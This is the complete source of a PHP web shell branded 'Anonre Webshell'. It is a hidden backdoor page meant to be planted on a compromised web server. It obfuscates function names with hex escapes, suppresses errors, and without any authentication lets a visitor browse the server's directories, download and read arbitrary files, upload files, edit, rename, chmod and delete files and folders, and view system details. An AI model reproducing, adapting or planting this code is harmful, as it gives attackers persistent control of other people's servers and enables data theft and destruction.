<?php error_reporting(0);
set_time_limit(0);
if (get_magic_quotes_gpc()) {
	foreach ($_POST as $key => $value) {
		$_POST[$key] = stripslashes($value);
	}
}
$system = php_uname();
$on = php_sapi_name();
$get_dir = "\x67" . "\x65\x74\x63\x77\x64";
$un_link = "\x75\x6e\x6c\x69\x6e\x6b";
$fgetents = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$rm_dir = "\x72\x6d\x64\x69\x72";
$sc4nd1r = "\x73\x63\x61\x6e\x64\x69\x72";
if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="' . basename($file) . '"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
echo '<!DOCTYPE HTML><html><head><link href=""rel="stylesheet"><title>Anonre Hidden Shell</title><style>
body{font-size:18px;font-family:"Racing Sans One",sans-serif;background-color:#021;color:#fff}#content tr:hover{background-color:green;text-shadow:0 0 10px #fff}#content .first{background-color:cyan}table{border:1px #000 dotted}a{color:#fff;text-decoration:none}a:hover{color:#00f;text-shadow:0 0 10px #fff}input[type=text],input[type=file],input[type=email],input[type=password],select{background:#111;color:cyan;border:0;padding:2px;border-bottom:1px solid #222;border-top:1px solid #222;-moz-border-radius:5px;-moz-box-shadow:0px 0px 10px color: cyan;-webkit-box-shadow:0 0 5px}input[type=submit],input[type=reset]{background-color:#000;color:cyan;border:1 solid cyan;border-radius:5px;box-shadow:0 2px 8px 0 cyan;text-align:center;margin:5px 2px;padding:2px;cursor:pointer}input[type=text],input[type=file],input[type=email],input[type=password],select:hover{border:1px solid cyan;background-color:#000;color:cyan}input[type=submit],input[type=reset]:hover{border-bottom:1px solid cyan;border-top:1px solid cyan;-moz-border-radius:5px;-moz-box-shadow:0px 0px 10px color: cyan;-webkit-box-shadow:0 0 5px}textarea{background-color:cyan;color:#fff}td{border:1px solid cyan;border-collapse:collapse;padding:5px}.destroy_table{background:0 0;border:1px solid cyan;font-family:Kelly Slab;display:inline-block;cursor:pointer;color:#fff;font-size:17x;font-weight:700;padding:3px 20px;text-decoration:#fff;text-shadow:0 0 0 #ff0505}li{display:inline;margin:1px;padding:1px}#menu a{padding:1px;margin:1px;background:#000;text-decoration:none;letter-spacing:2px;letter-spacing:2px;border-radius:1px;border-bottom:1px solid cyan;border-top:1px solid cyan;border-right:1px solid cyan;border-left:1px solid cyan}#menu a:hover{background:#000;border-bottom:0 solid #000;border-top:0 solid #000}hr{color:cyan}
</style><body><h1><center><font color="cyan">Anonre Webshell</font></center></h1>
<tr><td><center><font color="cyan">Uname </font><td>: <font color="lime">' . $system . '</font></tr></td><br><tr><td><font color="cyan">PHP </font><td>: <font color="lime">' . PHP_VERSION . ' </font><font color="white">on </font><font color="lime">' . $on . '</font></tr></td><br><tr><td><font color="cyan">Time </font><td>: <font color="lime">' . date("d M Y H:i:s", time()) . ' </font></tr></td></center><br>
<table width="500" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if (isset($_GET['path'])) {
	$path = $_GET['path'];
} else {
	$path = $get_dir();
}
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
foreach ($paths as $id => $pat) {
	if ($pat == '' && $id == 0) {
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if ($pat == '') continue;
	echo '<a href="?path=';
	for ($i = 0; $i <= $id; $i++) {
		echo "$paths[$i]";
		if ($i != $id) echo "/";
	}
	echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';
if (isset($_FILES['file'])) {
	if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
		echo '<font color="lime">Upload Successfull</font><br />';
	} else {
		echo '<font color="cyan">Upload Failed</font><br/>';
	}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" /><input type="submit" value="upload" /></form></td></tr>';
echo '<center><li class="destroy_table"><a href="?path=' . $path . '&do=newfile">New File</a></li>';
echo '<li class="destroy_table"><a href="?path=' . $path . '&opt=newfolder">New Folder</a></li></center>';
if (isset($_GET['filesrc'])) {
	echo "<tr><td>Current File : ";
	echo $_GET['filesrc'];
	echo '</tr></td></table><br />';
	echo '<center><a href="?act=download&dir=' . $path . '&file=' . $_GET['filesrc'] . '" class="destroy_table"><font color="cyan">Download</a></font> &nbsp;&nbsp; <a href="?" class="destroy_table"><font color="cyan">HOME</a></font> <br></center>';
	echo ('<center><textarea cols=115 rows=20>' . htmlspecialchars($fgetents($_GET['filesrc'])) . '</textarea>');
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
	echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
	if ($_POST['opt'] == 'chmod') {
		if (isset($_POST['perm'])) {
			if (chmod($_POST['path'], $_POST['perm'])) {
				echo '<font color="lime">Change Permission Successfull</font><br/>';
			} else {
				echo '<font color="cyan">Change Permission Failed</font><br />';
			}
		}
		echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
	} elseif ($_POST['opt'] == 'rename') {
		if (isset($_POST['newname'])) {
			if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
				echo '<font color="green">Rename Successfull</font><br/>';
			} else {
				echo '<font color="cyan">Rename Failed</font><br />';
			}
			$_POST['name'] = $_POST['newname'];
		}
		echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
	} elseif ($_POST['opt'] == 'edit') {
		if (isset($_POST['src'])) {
			$fp = fopen($_POST['path'], 'w');
			if (fwrite($fp, $_POST['src'])) {
				echo '<font color="lime">File Edited</font><br/>';
			} else {
				echo '<font color="cyan">File Cannot Be Edit</font><br/>';
			}
			fclose($fp);
		}
		echo '<form method="POST">
<textarea cols=115 rows=20 name="src">' . htmlspecialchars($fgetents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
	}
	echo '</center>';
} else {
	echo '</table><br/><center>';
	if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
		if ($_POST['type'] == 'dir') {
			if ($rm_dir($_POST['path'])) {
				echo '<font color="lime">Directory Deleted</font><br/>';
			} else {
				echo '<font color="cyan">Directory Cannot Be Deleted</font><br/>';
			}
		} elseif ($_POST['type'] == 'file') {
			if ($un_link($_POST['path'])) {
				echo '<font color="lime">File Deleted</font><br/>';
			} else {
				echo '<font color="cyan">File Cannot Be Deleted</font><br/>';
			}
		}
	} elseif ($_GET['opt'] == 'newfolder') {
		if ($_POST['new_save_folder']) {
			$new_folder = $path . '/' . htmlspecialchars($_POST['newfolder']);
			if (!mkdir($new_folder)) {
				$opt = "<font color=cyan>Folder Cannot Be Created</font>";
			} else {
				$opt = "<font color=lime>Folder Created</font>";
			}
		}
		echo $opt;
		echo "<form method='post'>
	<font color='cyan'>Folder Name: </font><input type='text' name='newfolder' style='width: 300px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
	} elseif ($_GET['do'] == 'newfile') { ?><center>
			<h1>
				<font color="cyan">Add File
			</h1>
			</font>
			<table>
				<form method="post" action="">
					<h2>Isi File : <br></h2> <textarea name="penjelasan" rows="10" cols="115"> </textarea>
					<font color="cyan">Nama File: </font><input type="text" name="name" style="width:300px"><input type="submit" name="ok" value="Simpan">
				</form>
			</table>
		</center><?php if (isset($_POST['ok'])) {
						if (empty($_POST['name'])) {
							print "Fill The Name Bastard!!!";
						} else {
							$filename = $_POST['name'];
							if (isset($_POST["penjelasan"])) {
								$data = $_POST["penjelasan"];
							}
							$buka = fopen("$filename", 'a+');
							fwrite($buka, "${data}");
							fclose($buka);
							if ($buka) {
								echo "<font color='lime'>File Created</a></font>";
							} else {
								echo "<font color='cyan'>Cannot Create File</a></font>";
							}
						}
					}
				}
				echo '</center>';
				$scandir = $sc4nd1r($path);
				echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Type</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Last Modified</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Action</peller></center></td>
</tr>';
				foreach ($scandir as $dir) {
					if (!is_dir($path . '/' . $dir) || $dir == '.' || $dir == '..') continue;
					$dtype = filetype("$path/$dir");
					$dtime = date("Y/m/d", filemtime("$path/$dir"));
					echo '<tr>
<td><img src="https://i.ibb.co/PwD5v2F/folder.png" width="15" height="15"><a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>
<td><center>' . $dtype . '</center></td>
<td><center>--</center></td>
<td><center>' . $dtime . '</center></td>
<td><center>';
					if (is_writable($path . '/' . $dir)) echo '<font color="lime">';
					elseif (!is_readable($path . '/' . $dir)) echo '<font color="cyan">';
					echo perms($path . '/' . $dir);
					if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) echo '</font>';
					echo '</center></td>
<td><center><form method="POST" action="?option&path=' . $path . '">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="' . $dir . '">
<input type="hidden" name="path" value="' . $path . '/' . $dir . '">
<input type="submit" value=">>>">
</form></center></td>
</tr>';
				}
				echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
				foreach ($scandir as $file) {
					if (!is_file($path . '/' . $file)) continue;
					$ftype = filetype("$path/$file");
					$ftime = date("Y/m/d", filemtime("$path/$file"));
					$size = filesize($path . '/' . $file) / 1024;
					$size = round($size, 3);
					if ($size >= 1024) {
						$size = round($size / 1024, 2) . ' MB';
					} else {
						$size = $size . ' KB';
					}
					echo '<tr>
<td><img src="https://i.ibb.co/NNRhXp3/def-file.png" width="15" height="15"><a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>
<td><center>' . $ftype . '</center></td>
<td><center>' . $size . '</center></td>
<td><center>' . $ftime . '</center></td>
<td><center>';
					if (is_writable($path . '/' . $file)) echo '<font color="lime">';
					elseif (!is_readable($path . '/' . $file)) echo '<font color="cyan">';
					echo perms($path . '/' . $file);
					if (is_writable($path . '/' . $file) || !is_readable($path . '/' . $file)) echo '</font>';
					echo '</center></td>
<td><center><form method="POST" action="?option&path=' . $path . '">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="' . $file . '">
<input type="hidden" name="path" value="' . $path . '/' . $file . '">
<input type="submit" value=">>>">
</form></center></td>
</tr>';
				}
				echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>
</div>';
			}
			echo '<center><br/>Copyright &copy; 2021 - Powered By Anonre</center>
</body>
</html>';
			function perms($file)
			{
				$perms = fileperms($file);
				if (($perms & 0xC000) == 0xC000) {
					$info = 's';
				} elseif (($perms & 0xA000) == 0xA000) {
					$info = 'l';
				} elseif (($perms & 0x8000) == 0x8000) {
					$info = '-';
				} elseif (($perms & 0x6000) == 0x6000) {
					$info = 'b';
				} elseif (($perms & 0x4000) == 0x4000) {
					$info = 'd';
				} elseif (($perms & 0x2000) == 0x2000) {
					$info = 'c';
				} elseif (($perms & 0x1000) == 0x1000) {
					$info = 'p';
				} else {
					$info = 'u';
				}
				$info .= (($perms & 0x0100) ? 'r' : '-');
				$info .= (($perms & 0x0080) ? 'w' : '-');
				$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
				$info .= (($perms & 0x0020) ? 'r' : '-');
				$info .= (($perms & 0x0010) ? 'w' : '-');
				$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
				$info .= (($perms & 0x0004) ? 'r' : '-');
				$info .= (($perms & 0x0002) ? 'w' : '-');
				$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
				return $info;
			} ?>
